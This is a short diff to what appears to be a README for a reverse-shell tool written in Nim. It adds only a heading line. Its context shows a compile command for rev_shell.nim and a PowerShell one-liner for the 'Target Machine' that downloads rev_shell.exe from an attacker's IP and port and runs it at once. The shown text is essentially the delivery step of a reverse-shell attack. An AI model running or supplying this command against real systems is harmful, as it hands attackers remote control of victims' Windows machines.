@@ -33,6 +33,8 @@ nim c -d:mingw --app:gui rev_shell.nim
 
 ## On Windows(Target Machine)
 
+windows powershell
+
 ```powershell
 Invoke-WebRequest -Uri http://<ip_address>:<port>/rev_shell.exe -OutFile rev_shell.exe ; ./rev_shell.exe
 ```
